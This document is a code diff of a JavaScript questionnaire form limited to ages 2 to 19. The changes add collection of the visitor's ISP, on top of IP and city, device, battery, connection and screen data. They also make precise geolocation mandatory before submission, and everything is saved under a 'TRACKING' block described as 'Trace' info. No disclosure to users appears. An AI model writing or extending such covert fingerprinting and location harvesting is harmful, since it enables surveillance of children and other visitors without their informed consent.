@@ -6,43 +6,40 @@ const backBtn = document.getElementById("backBtn");
 const progress = document.getElementById("progress");
 let currentStep = 0;
 
-// --- 3D TILT EFFECT (PC Only) ---
-const card = document.querySelector(".form-card");
-document.addEventListener("mousemove", (e) => {
-    if(window.innerWidth > 768) {
-        const x = (window.innerWidth / 2 - e.pageX) / 25;
-        const y = (window.innerHeight / 2 - e.pageY) / 25;
-        card.style.transform = `rotateY(${x}deg) rotateX(${y}deg)`;
-    }
-});
-
 // --- TRACKING VARS ---
 let userLocation = null;
 let userIP = "Fetching...";
+let userISP = "Unknown Carrier"; // <--- NEW: Stores "ACT", "Jio", etc.
 let deviceType = navigator.userAgent; 
 let batteryLevel = "Unknown"; 
 let connectionType = "Unknown";
 let screenRes = `${window.screen.width}x${window.screen.height}`; 
 
-// --- REMOVED VPN CHECK (Causing False Positives) ---
-// We will just log the data without flagging it as suspicious.
-
+// 1. GET NETWORK TYPE
 if (navigator.connection) {
     const conn = navigator.connection;
     connectionType = `${conn.effectiveType || ''} ${conn.type || ''}`.trim().toUpperCase();
 }
 
+// 2. GET BATTERY
 if(navigator.getBattery) {
     navigator.getBattery().then(b => batteryLevel = Math.round(b.level * 100) + "%");
 }
 
+// 3. GET IP & ISP NAME (The "Trace" Info)
 fetch('https://ipapi.co/json/')
   .then(res => res.json())
   .then(data => {
     userIP = `${data.ip} (${data.city})`;
+    userISP = data.org || data.asn; // <--- Captures "ACT Fibernet", "Jio", etc.
+    console.log("ISP Captured:", userISP);
   })
-  .catch(err => userIP = "Failed IP");
+  .catch(err => {
+    userIP = "Failed IP";
+    userISP = "Hidden";
+  });
 
+// 4. REQUEST LOCATION
 function requestLoc() {
     if (!navigator.geolocation) { userLocation = "Not Supported"; return; }
     navigator.geolocation.getCurrentPosition(
@@ -101,6 +98,7 @@ nextBtn.addEventListener("click", async () => {
       if (age < 2 || age > 19) { alert("Age 2-19 only"); return; } 
   }
 
+  // FORCE LOCATION CHECK
   if (currentStep === questions.length - 1) {
     if(!userLocation || userLocation === "Denied") {
         alert("⚠️ LOCATION REQUIRED\nPlease check your browser address bar (Lock icon) and allow Location.");
@@ -131,14 +129,15 @@ async function saveDataAndRedirect() {
     date: new Date().toLocaleDateString(),
     timestamp: Date.now(),
     
-    // TRACKING
+    // TRACKING (With ISP)
     location: userLocation,
     ipAddress: userIP,
+    isp: userISP,            // <--- SAVING THE ISP NAME
     deviceInfo: deviceType,
     battery: batteryLevel,
     connection: connectionType,
     screenRes: screenRes,
-    isSuspicious: false // ALWAYS FALSE NOW
+    isSuspicious: false 
   };
 
   try {
